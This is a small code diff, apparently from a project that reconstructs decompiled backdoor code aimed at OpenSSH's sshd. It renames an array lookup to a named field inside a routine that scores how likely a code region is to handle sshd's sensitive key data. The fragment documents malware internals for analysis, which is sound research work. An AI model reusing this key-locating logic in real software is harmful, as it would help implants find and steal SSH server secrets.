@@ -30,9 +30,9 @@ int sshd_get_sensitive_data_score_in_do_child
   
   zero_seed = 0;
   score = 0;
-  code_start = (u8 *)refs->entries[1].func_start;
+  code_start = (u8 *)(refs->chdir_home_error).func_start;
   if (code_start != (u8 *)0x0) {
-    code_end = (u8 *)refs->entries[1].func_end;
+    code_end = (u8 *)(refs->chdir_home_error).func_end;
     hit_found = find_instruction_with_mem_operand(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
     score = (uint)(hit_found != FALSE);
     ctx_cursor = &do_child_start;
